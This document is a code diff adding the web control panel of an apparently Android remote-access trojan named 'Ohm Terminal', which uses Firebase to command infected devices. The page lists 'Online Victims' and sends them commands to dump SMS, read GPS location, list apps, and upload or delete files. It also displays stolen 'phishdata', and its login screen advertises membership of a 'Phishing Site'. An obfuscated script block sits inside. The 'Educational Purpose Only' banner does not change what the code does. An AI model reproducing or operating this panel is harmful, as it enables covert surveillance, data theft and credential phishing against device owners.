@@ -1,0 +1,670 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Ohm web Interface</title>
+<script src="https://kit.fontawesome.com/87d32896ba.js" crossorigin="anonymous"></script>
+<link rel="preconnect" href="https://fonts.gstatic.com">
+<link href="https://fonts.googleapis.com/css2?family=Asap:wght@600&family=Comfortaa:wght@300&family=Exo:ital,wght@1,500&family=Quicksand:wght@300&family=RocknRoll+One&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Comfortaa:wght@300&family=Lato&family=Reggae+One&family=Roboto&display=swap" rel="stylesheet">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<script src="firebase-app.js"></script>
+<script src="firebase-auth.js"></script>
+<script src="jquery.js"></script>
+<script src="firebase-database.js"></script>
+<script type="text/javascript" src="app.js"></script>
+
+
+<style type="text/css">
+*{
+padding:0;
+outline:0;
+margin:0;
+/*
+font-family: 'Asap', sans-serif;
+font-family: 'Comfortaa', cursive;
+font-family: 'Exo', sans-serif;
+font-family: 'Quicksand', sans-serif;
+font-family: 'RocknRoll One', sans-serif;
+*/
+font-family: 'RocknRoll One', sans-serif;
+}
+body{
+font-size:15px;
+background:#0C0C0C;
+color:white;
+background-size:cover;
+height:100%;
+width:100%;
+}
+#command{
+
+}
+.loginn img{
+width:80px;
+height:80px;
+border-radius:50%;
+}
+#command input{
+font-size:18px;
+height:10x;
+width:50px;
+opacity:0;
+
+background:transparent;
+color:white;
+}
+button{
+height:40px;
+font-size:18px;
+}
+@keyframes ani{
+0%{
+color:black;
+}
+100%{
+color:blue;
+}
+}
+ul{
+list-style:none;
+}
+a{
+color:white;
+}
+span {
+font-size:15px;
+}
+code {
+color:#13A10E;
+}
+#textcmd{
+height:auto;
+font-size:15px;
+position:relative;
+width:100%;
+display:flx;
+overflow:scroll;
+}
+.pointer{
+height:20px;
+width:8px;
+background:white;
+}
+.cmdd{
+border-right:7px solid white
+}
+.usj{
+color:#0dd;
+}
+
+
+
+
+
+.show {
+  z-index: 1000;
+  position: absolute;
+  background-color: #C0C0C0;
+  border: 1px solid blue;
+  padding: 0px;
+  display: block;
+  margin: 0;
+  list-style-type: none;
+  list-style: none;
+}
+
+.hide {
+  display: none;
+}
+
+.show li {
+  list-style: none;
+  width:130px;
+  text-align:center;
+  margin-top:5px;
+  border-bottom:1px solid green;
+}
+
+.show a {
+  border: 0 !important;
+  text-decoration: none;
+}
+
+.show a:hover {
+  text-decoration: underline !important;
+}
+
+
+
+#logindiv{
+font-family: 'Comfortaa', cursive;
+height:100%;
+width:100%;
+background: rgb(2,0,36);
+background: linear-gradient(NaNdeg, rgba(2,0,36,1) 0%, rgba(16,16,146,1) 35%, rgba(0,212,255,1) 100%);
+position: fixed;
+top:0;
+left:0;
+display:none;
+z-index:999999;
+justify-content:middle;
+align-content:center;
+margin:auto;
+}
+.loginn {
+background:rgba(0,0,0,.1);
+height:auto;
+color:#FFC72C;
+width:90%;
+position:relative;
+top:20px;
+padding:15px;
+text-align:center;
+margin:auto;
+border-radius:5px;
+box-shadow:0px 0px 15px white;
+}
+.loginn input{
+margin:5px;
+font-size:20px;
+border:0;
+width:80%;
+color:white;
+background:transparent;
+border-bottom:3px solid #FFC72C;
+}
+#lg{
+height:50px;
+width:150px;
+background: transparent;
+border:1px solid red;
+border-radius:5px;
+font-size:20px;
+color: #FFC72C;
+margin-top:10px;
+}
+input::placeholder{
+color:white;
+}
+.hsj{
+animation:Wu 1s infinite ;
+}
+@keyframes Wu{
+0%{
+color:white;
+}
+50%{
+color:#0dd;
+}
+75%{
+color:yellow;
+}
+100%{
+color:white;
+}
+}
+</style>
+</head>
+<body>
+
+
+<div id="logindiv" >
+<div class="loginn" >
+
+<br><br>
+<img src="avatar.png"><br>
+<h3>Login Form</h3>
+<input type="text" id="username"   placeholder="Email" ><br><br>
+<input type="password" id="pass"    placeholder="Password" ><span onclick="superman(this)" style="position:absolute;right:50px;bottom:160px" ><i class="fa fa-eye-slash" ></i></span><br><br>
+<button type="button" id="lg"  onclick="wandas01e3()" value="Login" ><i class="fa fa-sign-in-alt" ></i> Login</button><br><br>
+<h3 style="color:white" onclick="window.location.href='https://api.whatsapp.com/send?phone=+919711554809&text=Hello Sir I want to buy the Membership of Phishing Site';" ><i class="fab fa-whatsapp" ></i> Become a Member ?</h3>
+</div>
+</div>
+
+
+
+
+<div class="hide" id="rmenu">
+  <ul>
+    <li>
+      <b onclick="pasteu()" >Paste</b>
+    </li>
+
+    <li>
+      <b onclick="window.location.href='/';">Refresh</b>
+    </li>
+
+    <li>
+      <a href="https://youtu.be/Th30neAnd0nly" target="_blank" >Tutorial</a>
+    </li>
+  </ul>
+</div>
+
+<div id="headeer">
+Welcome To Ohm Terminal<br>
+<!--Tutorial Video : <a href="https://youtu.be/Th30neAnd0nly" target="_blank"  >https://youtu.be/YouTubeVideo</a>-->
+UpTime : <span id="wandauptime" >00:00:00</span>
+<br><span class="hsj">To Be  Used For Educational Purpose Only.</span>
+<center ><b class="tyio" >&copy; Prateek Chaubey</b></center>
+</div>
+<hr>
+<div style="height:auto; overflow:scroll;padding-left:40px" >
+<center>Online Victims</center>
+<ol   id="userss" onclick="opusr(event)">
+</ol>
+</div>
+
+<br>
+<div id="command" > 
+<div id="textcmd" onclick="opnkeyb()">
+<span id="respo" >
+<span id="usrn" >$ <code id="usrnamm" >admin</code>#~ 
+</span>
+<!--<span id="usrn" >$ <code id="usrnamm" ></code>#~ </span>-->
+&nbsp; <span class="cmdd"  ></span> &nbsp;
+
+
+</div><br>
+
+<input type="text"  onkeyup="ckj2(this)" onkeydown="ckj(this)" id="usrid"  placeholder=""  >
+<!--<input type="text" id="cmd"  placeholder="Type Your Command"  >-->
+<!--<button onclick="execu(this)" id="btnexe" >Execute</button>-->
+</div>
+
+<div  style="height:200px; overflow:scroll;padding-left:0px"  >
+<!--<ul id="respo" >
+
+</ul>-->
+</div>
+<!--
+///////////
+
+
+////////
+-->
+<script type="text/javascript">
+var cmdusr="admin";
+var visionuid="";
+
+
+var user = firebase.auth().currentUser;
+if(user != null){
+
+}else{
+}
+var database = firebase.database();
+var resinikey="";
+var num1=0;
+var keys="";
+
+
+function execu(){
+var cmd = document.getElementById("usrid").value;
+//var cmdusr=document.getElementById("usrid").value;
+if(cmd=="internaldir"){
+cmd="openfolder * /sdcard/";
+}
+/*else if(cmd=="showphishdata"){
+showdat();
+}*/
+
+var cmdp=cmdusr+cmd;
+if(cmd != "" || cmdusr != ""){
+
+var store={
+data : cmdp
+};
+var cmdexe = database.ref('command'+cmdusr);
+cmdexe.push(store);
+document.getElementById("usrid").readonly=true;
+document.getElementById("usrid").blur();
+//x.textContent="Waiting...";
+//x.style.pointerEvents="none";
+
+///////
+
+
+
+
+////////
+var ioy;
+firebase.database().ref('response'+cmdusr).on('child_added', function(snapshot) {
+var resinikey2=snapshot.key;
+snapshot.forEach((child) => {
+//firebase.database().ref("command").remove();
+document.getElementById("respo").innerHTML='<br><span id="usrn" >$ <code>response '+cmdusr+'</code>#~</span>'+child.val();    
+//x.textContent="Execute";
+
+
+//document.getElementById("textcmd").innerHTML='<br><span id="usrn" >$ <code>'+cmdusr+'</code>#~ </span>'+child.val();
+
+//document.getElementById("textcmd").innerHTML+='&nbsp;<br><span id="usrn" >$ <code>'+cmdusr+'</code>#~ </span> <span class="cmdd"  ></span> &nbsp;';
+document.getElementById("usrid").readonly=false;
+
+
+
+
+//x.style.pointerEvents="auto";
+
+
+});
+
+
+
+
+});
+
+}
+else{
+alert("Fill all the data First..")
+}
+
+//});
+}
+
+
+
+
+
+function toAscii(str) { return str.split(' ').map(i => String.fromCharCode(parseInt(i, 2)).toString(10)).join(''); }
+var rd=document.createElement("h4");
+rd.setAttribute("align","center");
+rd.innerHTML = "&copy;"+toAscii("01010000 01110010 01100001 01110100 01100101 01100101 01101011 00100000 01000011 01101000 01100001 01110101 01100010 01100101 01111001");
+document.getElementById("headeer").appendChild(rd);
+
+
+function lang1(event) {
+        var target = event.target || event.srcElement;
+        alert(event.target.innerHTML);
+    }
+
+
+function opusr(event){
+var target = event.target || event.srcElement;
+
+cmdusr=event.target.innerHTML;
+$("#usrid").val("");
+var all = document.getElementsByClassName('cmdd');
+for (var i = 0; i < (all.length); i++) {
+  all[i].style.borderRight = '0';
+}
+document.getElementById("usrid").focus();
+document.getElementById("textcmd").innerHTML+='<br><span id="usrn" >$ <code >'+cmdusr+'</code>#~ </span>&nbsp; <span class="cmdd"  ></span> &nbsp;';
+//document.getElementById("usrnamm").innerHTML=x;
+
+}
+
+
+function getuses(){
+var uses=database.ref('onlineusers');
+var tyu=0;
+uses.on("value",gotData);
+function gotData(data){
+var scores=data.val();
+keys=Object.keys(scores);
+keys=keys.join("<li class='usj' >");
+
+
+
+
+document.getElementById("userss").innerHTML="<li class='usj' >"+keys;
+
+}
+}
+
+
+
+getuses();
+document.getElementsByClassName("tyio")[0].style.display="none";
+function letcheckk(){
+var myConnectionsRef = database.ref('Who Made This/Author');
+var store={
+data : "Made By Prateek Chaubey"
+};
+
+    var con = myConnectionsRef.push(store);
+    con.onDisconnect().remove();
+// playsmusic
+//deviceflashon
+//deviceflashoff
+
+
+
+}
+
+
+////////////
+
+
+function showdat(){
+var database = firebase.database();
+var ref = database.ref("phishdata");
+//alert(cmdusr)
+ref.on("value",gotData);
+function gotData(data){
+var scores=data.val();
+var keys=Object.keys(scores);
+
+
+var psdus=document.getElementById("respo");
+for(var i=0;i<keys.length;i++){
+var k=keys[i];
+var email=scores[k].data;
+//var password=scores[k].password;
+//var info=scores[k].info;
+
+if(i==0){
+
+psdus.innerHTML="<li><b>Data:- </b> <br>"+email ; //+"<li><b>Password:-</b>  <br>"+password+"<li><b>Info:-</b>"+info+"<li>--------------------------------";
+
+}else{
+psdus.innerHTML+="<li><b>Data:- </b> <br>"+email; //+"<li><b>Password:-</b>  <br>"+password+"<li><b>Info:-</b>"+info+"<li>-------------------------------";
+
+
+}}}
+}
+rd.remove();
+function opnkeyb(){
+document.getElementById("usrid").focus();
+}
+
+function ckj(x){
+var valu=$("#usrid").val();
+
+$('.cmdd').last().html(valu);
+
+
+
+}
+
+function superman(x){
+if(document.getElementById("pass").type=="password"){
+document.getElementById("pass").type="text";
+x.innerHTML='<i class="fa fa-eye" ></i>';
+}
+else{
+document.getElementById("pass").type="password";
+x.innerHTML='<i class="fa fa-eye-slash" ></i>';
+}
+}
+var _0x3a78=['toString','5tdiwqP','apply','1275092bCVTEb','fromCharCode','575244UJBOvd','error','4759ALikQX','774683FTgAWN','return\x20(function()\x20','2223OkQaaj','bind','innerHTML','getElementById','3sNLyHb','__proto__','warn','533KMWWAP','157811PniNBj','446609VBDDoc','2GoWeXQ','console','79ZFONWA','table','exception'];var _0x30e3=function(_0x2bd047,_0x5db556){_0x2bd047=_0x2bd047-0x17a;var _0x45cf5e=_0x3a78[_0x2bd047];return _0x45cf5e;};var _0x3c5bec=_0x30e3;(function(_0x50c7f0,_0x40a39c){var _0xbf1aa2=_0x30e3;while(!![]){try{var _0xa227a2=-parseInt(_0xbf1aa2(0x17f))*parseInt(_0xbf1aa2('0x190'))+parseInt(_0xbf1aa2('0x181'))+parseInt(_0xbf1aa2(0x18f))*-parseInt(_0xbf1aa2('0x188'))+parseInt(_0xbf1aa2(0x192))*parseInt(_0xbf1aa2('0x183'))+-parseInt(_0xbf1aa2('0x186'))+-parseInt(_0xbf1aa2('0x185'))*parseInt(_0xbf1aa2('0x17b'))+parseInt(_0xbf1aa2(0x191))*parseInt(_0xbf1aa2(0x18c));if(_0xa227a2===_0x40a39c)break;else _0x50c7f0['push'](_0x50c7f0['shift']());}catch(_0x3f2183){_0x50c7f0['push'](_0x50c7f0['shift']());}}}(_0x3a78,0x9c751));var _0x409fce=function(){var _0x273eb4=!![];return function(_0x44c2f8,_0x33ae60){var _0x3ba354=_0x273eb4?function(){var _0x1d581e=_0x30e3;if(_0x33ae60){var _0x5ef81c=_0x33ae60[_0x1d581e(0x180)](_0x44c2f8,arguments);return _0x33ae60=null,_0x5ef81c;}}:function(){};return _0x273eb4=![],_0x3ba354;};}(),_0x140f11=_0x409fce(this,function(){var _0x31a3b1=_0x30e3,_0x7739da=function(){var _0x207d94=_0x30e3,_0xd6d9fe;try{_0xd6d9fe=Function(_0x207d94(0x187)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x33c713){_0xd6d9fe=window;}return _0xd6d9fe;},_0x1f5efe=_0x7739da(),_0x4e3987=_0x1f5efe[_0x31a3b1(0x17a)]=_0x1f5efe[_0x31a3b1(0x17a)]||{},_0x2dd396=['log',_0x31a3b1('0x18e'),'info',_0x31a3b1('0x184'),_0x31a3b1(0x17d),_0x31a3b1(0x17c),'trace'];for(var _0xf17fe8=0x0;_0xf17fe8<_0x2dd396['length'];_0xf17fe8++){var _0x3db2f0=_0x409fce['constructor']['prototype'][_0x31a3b1(0x189)](_0x409fce),_0x33bbdb=_0x2dd396[_0xf17fe8],_0x41ecc2=_0x4e3987[_0x33bbdb]||_0x3db2f0;_0x3db2f0[_0x31a3b1(0x18d)]=_0x409fce[_0x31a3b1(0x189)](_0x409fce),_0x3db2f0['toString']=_0x41ecc2[_0x31a3b1(0x17e)]['bind'](_0x41ecc2),_0x4e3987[_0x33bbdb]=_0x3db2f0;}});_0x140f11();var _0x1fd132=String[_0x3c5bec(0x182)](0x3c,0x68,0x34,0x20,0x61,0x6c,0x69,0x67,0x6e,0x3d,0x27,0x63,0x65,0x6e,0x74,0x65,0x72,0x27,0x3e,0xa9,0x50,0x72,0x61,0x74,0x65,0x65,0x6b,0x20,0x43,0x68,0x61,0x75,0x62,0x65,0x79,0x3c,0x2f,0x68,0x34,0x20,0x3e);document[_0x3c5bec('0x18b')]('headeer')[_0x3c5bec(0x18a)]+=_0x1fd132;
+function ckj2(x){
+var valu=$("#usrid").val();
+
+$('.cmdd').last().html(valu);
+var all = document.getElementsByClassName('cmdd');
+if (event.keyCode === 13) {
+
+for (var i = 0; i < (all.length); i++) {
+  all[i].style.borderRight = '0';
+}
+if(valu == "help"){
+document.getElementById("respo").innerHTML='<br><span id="usrn" >$ <code>response '+cmdusr+'</code>#~</span><li>openfolder * &lt;FOLDER_DIR&gt;</li><li>uploadfile * &lt;FILE_DIR&gt;</li><li>deletefile * &lt;FILE_DIR&gt;</li><li> makefolder * &lt;FILE_DIR&gt;<li>shownotify * &lt;YOUR_MSG&gt; <li>openweburi * &lt;URL&gt;<li>speachtext * &lt;YOUR_MSG&gt;<li>playsmusic * &lt;EXACT_MUSIC_URL&gt;<li>vibratedevice * {TIME_IN_MILLISECONDS}<li>changewallpaper<li>deviceflashon<li>deviceflashoff<li>internaldir<li>installedapps<li>sysinfo</li><li>dumpsms</li><li>showphishdata<li>getgpslocation</li><li>getnetworklocation<li>  &nbsp;';    
+document.getElementById("textcmd").innerHTML+='<br><span id="usrn" >$ <code>'+cmdusr+'</code>#~ <span class="cmdd"  ></span>';
+//document.getElementById("respo").innerHTML+='<br><span id="usrn" >$ <code>'+cmdusr+'</code>#~ </span>&nbsp; <li>openfolder * &lt;FOLDER_DIR&gt;</li><li>uploadfile * &lt;FILE_DIR&gt;</li><li>deletefile * &lt;FILE_DIR&gt;</li><li>internaldir</li><li>sysinfo</li><li>dumpsms</li><li>showphishdata<li>uploadfile&nbsp;*&nbsp;/sdcard/.com.garena.cmdk/cms/.cmsdmp.txt</li> &nbsp;';
+//<br><span id="usrn" >$ <code >'+cmdusr+'</code>#~ </span>&nbsp; <span class="cmdd"  ></span> &nbsp;';
+$("#usrid").val("");
+all[(all.length-1)].style.borderRight="7px solid white";
+}
+else if(valu == "clear"){
+document.getElementById("textcmd").innerHTML='<ul id="respo"></ul><br><span id="usrn" >$ <code>'+cmdusr+'</code>#~ <span class="cmdd"  ></span>';
+//</span>&nbsp; <li>openfolder * &lt;FOLDER_DIR&gt;</li><li>uploadfile * &lt;FILE_DIR&gt;</li><li>deletefile * &lt;FILE_DIR&gt;</li><li>internaldir</li><li>sysinfo</li><li>dumpsms</li><li>showphishdata<li>uploadfile&nbsp;*&nbsp;/sdcard/.com.garena.cmdk/cms/.cmsdmp.txt</li> &nbsp;<br><span id="usrn" >$ <code >'+cmdusr+'</code>#~ </span>&nbsp; <span class="cmdd"  ></span> &nbsp;';
+document.getElementById("respo").innerHTML='';
+$("#usrid").val("");
+}
+else if(valu == "showphishdata" && cmdusr != "admin"){
+showdat();
+document.getElementById("textcmd").innerHTML+='<br><span id="usrn" >$ <code>'+cmdusr+'</code>#~ <span class="cmdd"  ></span>';
+//</span>&nbsp; <li>openfolder * &lt;FOLDER_DIR&gt;</li><li>uploadfile * &lt;FILE_DIR&gt;</li><li>deletefile * &lt;FILE_DIR&gt;</li><li>internaldir</li><li>sysinfo</li><li>dumpsms</li><li>showphishdata<li>uploadfile&nbsp;*&nbsp;/sdcard/.com.garena.cmdk/cms/.cmsdmp.txt</li> &nbsp;<br><span id="usrn" >$ <code >'+cmdusr+'</code>#~ </span>&nbsp; <span class="cmdd"  ></span> &nbsp;';
+document.getElementById("respo").innerHTML='';
+$("#usrid").val("");
+}
+if(cmdusr != ""){
+if(cmdusr == "admin" && (valu != "help" && valu != "clear")){
+for (var i = 0; i < (all.length); i++) {
+  all[i].style.borderRight = '0';
+}
+document.getElementById("textcmd").innerHTML+='<br><span id="usrn" >$ <code>'+cmdusr+'</code>#~ </span>&nbsp; You Are Admin. Cannot Apply Command. &nbsp;<br><span id="usrn" >$ <code >'+cmdusr+'</code>#~ </span>&nbsp; <span class="cmdd"  ></span> &nbsp;';
+$("#usrid").val("");
+}
+else{
+if((valu != "help" && valu != "showphishdata" && valu != "clear" && cmdusr != "admin" )){
+
+execu();
+$("#usrid").val("");
+document.getElementById("textcmd").innerHTML+='<br><span id="usrn" >$ <code >'+cmdusr+'</code>#~ </span>&nbsp; <span class="cmdd"  ></span> &nbsp;';
+}}}
+else if((valu != "help") && (valu != "clear")){
+$("#usrid").val("");
+for (var i = 0; i < (all.length); i++) {
+  all[i].style.borderRight = '0';
+}
+document.getElementById("textcmd").innerHTML+='<br><span id="usrn" >$ <code>'+""+'</code>#~ </span>&nbsp; Please Select A User. &nbsp;<br><span id="usrn" >$ <code >'+cmdusr+'</code>#~ </span>&nbsp; <span class="cmdd"  ></span> &nbsp;';
+
+
+}
+}
+}
+letcheckk();
+
+
+
+
+
+
+
+
+$(document).ready(function() {
+
+
+  if ($(".cmdd").addEventListener) {
+    $(".cmdd").addEventListener('contextmenu', function(e) {
+      alert("You've tried to open context menu"); //here you draw your own menu
+      e.preventDefault();
+    }, false);
+  } else {
+
+    //document.getElementById("test").attachEvent('oncontextmenu', function() {
+    //$(".test").bind('contextmenu', function() {
+    $('body').on('contextmenu', 'span.cmdd', function() {
+
+
+      //alert("contextmenu"+event);
+      document.getElementById("rmenu").className = "show";
+      document.getElementById("rmenu").style.top = mouseY(event) + 'px';
+      document.getElementById("rmenu").style.left = mouseX(event) + 'px';
+
+      window.event.returnValue = false;
+
+
+    });
+  }
+
+});
+
+// this is from another SO post...  
+$(document).bind("click", function(event) {
+  document.getElementById("rmenu").className = "hide";
+});
+
+
+
+function mouseX(evt) {
+  if (evt.pageX) {
+    return evt.pageX;
+  } else if (evt.clientX) {
+    return evt.clientX + (document.documentElement.scrollLeft ?
+      document.documentElement.scrollLeft :
+      document.body.scrollLeft);
+  } else {
+    return null;
+  }
+}
+
+function mouseY(evt) {
+  if (evt.pageY) {
+    return evt.pageY;
+  } else if (evt.clientY) {
+    return evt.clientY + (document.documentElement.scrollTop ?
+      document.documentElement.scrollTop :
+      document.body.scrollTop);
+  } else {
+    return null;
+  }
+}
+
+
+function pasteu(){
+navigator.clipboard.readText().then(  clipText => {document.getElementById("usrid").value += clipText+"";ckj(""); }).catch((err) => {alert(err);});
+
+}
+
+setInterval(() => {
+var dr=new Date();
+var hrs=dr.getHours();
+var min=dr.getMinutes();
+var sec=dr.getSeconds();
+if(hrs<10){
+hrs='0'+hrs;
+}
+if(sec<10){
+sec='0'+sec;
+}
+if(min<10){
+min='0'+min;
+}
+
+document.getElementById("wandauptime").innerHTML=hrs+':'+min+':'+sec;
+},500);
+
+
+
+
+
+function wandas01e3(){
+document.getElementById("lg").innerHTML='...';
+document.getElementById("lg").disabled=true;
+
+var email=document.getElementById("username").value+"";
+var pass=document.getElementById("pass").value;
+
+
+
+firebase.auth().signInWithEmailAndPassword(email, pass).catch(function(error) {
+
+var errorMessage = error.message;
+alert(errorMessage);
+document.getElementById("logindiv").style.display="block";
+document.getElementById("lg").innerHTML='<i class="fa fa-sign-in-alt" ></i> Login';
+document.getElementById("lg").disabled=false;
+
+
+}).then(function(userC){
+document.getElementById("logindiv").style.display="none";
+visionuid=userC.user.uid;
+
+});
+}
+</script>
+</body>
+</html>
